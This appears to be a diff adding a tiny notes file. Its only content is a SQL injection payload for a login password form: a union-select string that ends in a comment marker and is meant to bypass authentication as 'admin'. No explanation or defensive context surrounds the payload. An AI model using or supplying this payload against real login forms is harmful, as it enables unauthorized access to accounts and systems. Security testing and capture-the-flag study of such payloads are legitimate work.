@@ -1,0 +1,4 @@
+on login password form
+
+
+admin' union select "admin",2,3 -- 
